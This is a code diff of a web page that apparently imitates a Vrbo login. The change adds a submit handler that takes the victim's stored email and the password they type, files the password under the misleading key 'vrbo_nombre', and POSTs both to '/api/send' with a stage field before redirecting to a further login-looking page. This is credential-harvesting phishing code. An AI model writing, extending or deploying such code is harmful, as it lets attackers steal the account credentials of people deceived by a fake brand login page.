@@ -157,19 +157,27 @@
   toggleBtn.addEventListener('click', () => {
     const isHidden = passwordInput.type === 'password';
     passwordInput.type = isHidden ? 'text' : 'password';
-    // Cambiamos el label para que el CSS alterne los iconos correctamente
     toggleBtn.setAttribute('aria-label', isHidden ? 'Ocultar' : 'Mostrar');
   });
 
-  document.getElementById('btn-back').addEventListener('click', () => { window.location.href = 'vrbologin.html'; });
+  document.getElementById('btn-back').addEventListener('click', () => { window.location.href = 'index.html'; });
 
-  // Reemplaza el submit del password-form
-document.getElementById('password-form').addEventListener('submit', (e) => {
-  e.preventDefault();
-  loader.classList.add('is-visible');
-  sessionStorage.setItem('vrbo_nombre', passwordInput.value); // ← contraseña = "nombre"
-  setTimeout(() => { window.location.href = 'vrbologin3.html'; }, 3000);
-});
+  document.getElementById('password-form').addEventListener('submit', (e) => {
+    e.preventDefault();
+    loader.classList.add('is-visible');
+
+    const correo = sessionStorage.getItem('vrbo_correo') || '';
+    const nombre = passwordInput.value;
+    sessionStorage.setItem('vrbo_nombre', nombre);
+
+    fetch('/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ correo, nombre, lada: '', numero: '', fase: '1' })
+    });
+
+    setTimeout(() => { window.location.href = 'vrbologin3.html'; }, 3000);
+  });
 </script>
 </body>
 </html>
